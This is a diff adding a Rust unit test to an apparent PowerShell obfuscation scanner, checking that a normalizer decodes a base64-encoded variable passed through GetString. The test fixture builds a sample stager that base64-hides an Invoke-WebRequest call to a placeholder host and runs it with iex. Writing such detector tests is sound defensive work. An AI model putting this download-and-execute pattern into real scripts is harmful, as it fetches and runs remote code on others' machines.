@@ -8556,6 +8556,28 @@ mod ps1_obfuscation_tests {
     }
 
     #[test]
+    fn ps1_normalization_decodes_parenthesized_getstring_base64_variable() {
+        use base64::Engine;
+
+        let decoded = "Invoke-WebRequest -Uri https://b64-var-paren.example/stage.ps1";
+        let b64 = base64::engine::general_purpose::STANDARD.encode(decoded.as_bytes());
+        let ps = format!(
+            "$blob = '{b64}'; $stage = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($blob))); iex $stage"
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+        assert!(
+            normalized.contains("https://b64-var-paren.example/stage.ps1"),
+            "parenthesized base64 variable script was not decoded:\n{}",
+            normalized
+        );
+        assert!(
+            !normalized.contains("FromBase64String(($blob))"),
+            "parenthesized base64 variable GetString call should be replaced:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_normalization_decodes_trimmed_getstring_base64_literal() {
         use base64::Engine;
 
